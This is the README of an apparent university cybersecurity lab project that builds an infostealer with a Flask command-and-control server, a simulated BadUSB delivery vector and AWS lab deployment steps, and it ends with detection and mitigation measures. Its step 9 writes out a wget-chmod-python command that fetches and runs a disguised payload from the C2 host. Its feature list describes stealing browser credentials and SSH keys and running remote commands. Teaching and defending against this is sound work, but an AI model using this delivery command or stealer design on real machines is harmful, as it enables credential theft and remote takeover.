This repository presents an infostealer malware project with Command & Control (C2) infrastructure, developed for educational purposes in the **CyberSecurity Fundamentals** discipline at **UnB 2025.1**.

## üéØ Project Objective

The main objective is to develop and implement a laboratory environment for simulating a cyberattack focused on **credential and sensitive data theft via Infostealer**, and maintaining **persistence through a C2 infrastructure**. The simulation aims to understand the dynamics of such attacks and propose **comprehensive solutions** (technical, operational, and procedural) for their detection, prevention, and mitigation.

This work was developed as part of the **CyberSecurity Fundamentals Seminar at UnB 2025.1**.

## ‚ú® Features

The project simulates a multi-stage attack, including the following key components:

* **HID Device Infection Vector (Simulated BadUSB):**
    * Simulates a USB drive that emulates a keyboard (BadUSB) to inject initial commands into the victim machine.
    * Injects commands to download and execute the Infostealer autonomously on the target machine.
* **Infostealer (Malicious Client):**
    * Developed in **Python** for multi-platform compatibility (Linux demonstrated).
    * Collects browser credentials (**Firefox**, **Chromium**).
    * Collects sensitive files (**.bash_history**, **SSH keys**).
    * Searches for **.txt** files containing keywords in their names.
    * Collects system information.
    * Exfiltrates complete files and collected information to the C2 via **HTTP POST**.
* **Command & Control (C2 Server):**
    * Implemented in **Flask (Python)**.
    * Receives and stores exfiltrated data, organized by victim ID and category.
    * Serves the `stealer_client.py` payload for download.
    * Allows the operator to send arbitrary commands to the Infostealer client, receiving the output.
    * Maintains client persistence.

## ‚öôÔ∏è Lab Setup

1. **Install Required Tools**
    - Download and install [Terraform](https://www.terraform.io/downloads.html).
    - Download and install [Ansible](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html) (not just the core).
    - Download and install [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html).

2. **Set Up AWS Credentials and SSH Keys**
    - Create an AWS account and generate an Access Key for CLI usage.
    - Run `aws configure` to set up your credentials.
    - Create a SSH `key_pair` for your VMs

3. **Configure Variables**
    - Edit `variables.tfvars` and set your `key_pair` and IP address.
    - You can find your IP address with:  
      ```bash
      curl https://ipinfo.io/ip
      ```

4. **Prepare Deployment Script**
    - Make the deployment script executable:  
      ```bash
      chmod +x deploy.sh
      ```

5. **Deploy Infrastructure**
    - Run the deployment script, passing the path to your private key:  
      ```bash
      ./deploy.sh path-to-private-key
      ```
    - The script runs `terraform apply -auto-approve` and `ansible-playbook -i hosts playbook.yaml`.  
      You can also run these commands manually if needed and for terraform run `terraform apply` without `-auto-approve` to be asked to perform the actions.

6. **Access the Virtual Machines**
    - SSH into the web server VM:  
      ```bash
      ssh ubuntu@<IP_VM> -i path-to-private-key
      ```

7. **Troubleshooting**
    - If you see an error like:
      ```
      fatal: [<IP>]: UNREACHABLE! => {"changed": false, "msg": "Failed to connect to the host via ssh: ssh: connect to host <IP> port 22: Connection timed out", "unreachable": true}
      ```
      This can rarely happen when running `deploy.sh`. If it does, simply run the script again.

8. **Manual Fix**
    - On the victim VM, you need to run a script to seed the sensitive data in the machine:
      ```bash
      cd /tmp && ./seed_sensitive_files.sh
      ```

9. **Simulate and Detect the InfoStealer Attack**
    - On the victim VM, run (simulation of the USB):
      ```bash
      mkdir -p ~/.config/.systemd-user/ && cd ~/.config/.systemd-user/

      wget ${C2_URL}/security_debian_x386 -O /tmp/${INFOSTEALER_FILENAME} && chmod +x /tmp/${INFOSTEALER_FILENAME} && python3 /tmp/${INFOSTEALER_FILENAME}
      ```

        ## **TODO: INSERT THE OTHER STEPS**

10. **Destroy and Clean Up the Environment**
    - To remove all provisioned resources and avoid unnecessary charges, run:
        ```bash
        terraform destroy
        ```
- **WARNING: If you do NOT destroy the infrastructure after use, AWS may CHARGE YOU for active resources if you exceed the AWS Free Tier limits!**


> **NOTE:** While this setup is designed to stay within AWS Free Tier limits, you may incur small charges (a few cents) for data transfer.

## üõ°Ô∏è Detection and Mitigation Strategies

The project emphasizes proposing comprehensive solutions for detecting, preventing, and mitigating the simulated attack.

* **Technical Controls:** Firewall, EDR/Antivirus, OS hardening, log monitoring, network traffic analysis (IDS/IPS).
* **Operational Measures:** Incident Response Plan (IRP), threat hunting, backups.
* **Procedural Measures:** User awareness regarding social engineering and secure USB usage, USB device usage policies, principle of least privilege.
